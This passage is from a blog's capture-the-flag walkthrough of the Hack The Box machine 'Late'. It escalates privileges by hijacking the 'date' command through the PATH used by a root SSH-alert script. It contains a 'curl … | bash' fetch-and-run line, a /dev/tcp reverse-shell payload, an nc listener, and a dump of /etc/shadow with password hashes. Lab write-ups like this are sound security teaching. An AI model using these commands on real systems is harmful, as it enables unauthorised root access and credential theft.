+</code></pre></div><p>The attribute <strong>a</strong> stands for append only , which only allows users to append to a file.</p>
+<p>So let&rsquo;s do it with <strong>curl</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ echo <span style="color:#e6db74">&#34;curl 10.10.16.8 | bash&#34;</span> &gt;&gt; ssh-alert.sh 
+-bash: ssh-alert.sh: Operation not permitted
+</code></pre></div><p>So it fails for some reasons. checking the content of <code>ssh-alert.sh</code> file again we found that <code>data</code> and  <code>uname</code> commands are not used with their absolute path (full path). If any command is not used with its absolute path in any bash script, then it creates PATH hijacking vulnerability which often leads to privilege escalation. <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank">more&amp;hellip;</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+
+RECIPIENT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root@late.htb&#34;</span>
+SUBJECT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email from Server Login: SSH Alert&#34;</span>
+
+BODY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">A SSH login was detected.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        User:        </span>$PAM_USER<span style="color:#e6db74">
+</span><span style="color:#e6db74">        User IP Host: </span>$PAM_RHOST<span style="color:#e6db74">
+</span><span style="color:#e6db74">        Service:     </span>$PAM_SERVICE<span style="color:#e6db74">
+</span><span style="color:#e6db74">        TTY:         </span>$PAM_TTY<span style="color:#e6db74">
+</span><span style="color:#e6db74">        Date:        `date` ## date command without a absolute path
+</span><span style="color:#e6db74">        Server:      `uname -a` ## uname command without a absolute path
+</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">${</span>PAM_TYPE<span style="color:#e6db74">}</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;open_session&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+        echo <span style="color:#e6db74">&#34;Subject:</span><span style="color:#e6db74">${</span>SUBJECT<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span>BODY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | /usr/sbin/sendmail <span style="color:#e6db74">${</span>RECIPIENT<span style="color:#e6db74">}</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>if we check the PATH environment variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ echo $PATH
+/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</code></pre></div><p>So it&rsquo;s clear enough now, I&rsquo;ll hijack the <code>date</code> command as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.8/9002 0&gt;&amp;1&#39;</span> &gt; date
+</code></pre></div><p>then give it the executable permission:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ chmod +x date 
+</code></pre></div><p>setup a nc listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch root<span style="color:#f92672">]</span>$ nc -lvnp <span style="color:#ae81ff">9002</span>
+</code></pre></div><p>then logout from the ssh session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc_acc@late:/usr/local/sbin$ exit
+logout
+Connection to late.htb closed.
+<span style="color:#f92672">[</span>werz@Arch user<span style="color:#f92672">]</span>$ 
+</code></pre></div><p>and we got a root reverse shell hit back!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch root<span style="color:#f92672">]</span>$ nc -lvnp <span style="color:#ae81ff">9002</span>
+Connection from 10.10.11.156:42138
+bash: cannot set terminal process group <span style="color:#f92672">(</span>27748<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+root@late:/# cat /etc/shadow  
+cat /etc/shadow
+root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl/aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18997:0:99999:7:::
+svc_acc:$6$/WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9/MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7:::
+rtkit:*:18997:0:99999:7:::
+usbmux:*:18997:0:99999:7:::
+avahi:*:18997:0:99999:7:::
+cups-pk-helper:*:18997:0:99999:7:::
+saned:*:18997:0:99999:7:::
+colord:*:18997:0:99999:7:::
+pulse:*:18997:0:99999:7:::
+geoclue:*:18997:0:99999:7:::
+smmta:*:19006:0:99999:7:::
+smmsp:*:19006:0:99999:7:::
+root@late:/# 
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://0xwerz.github.io/14/08/2022/outdated/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Outdated -- HTB walkthrough</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://0xwerz.github.io/19/02/2022/undetected/">
+                  <span class="button__text">Undetected -- HTB walkthrough</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
+      
+  </div>
+</footer>
+
+<script src="https://0xwerz.github.io/assets/main.js"></script>
+<script src="https://0xwerz.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
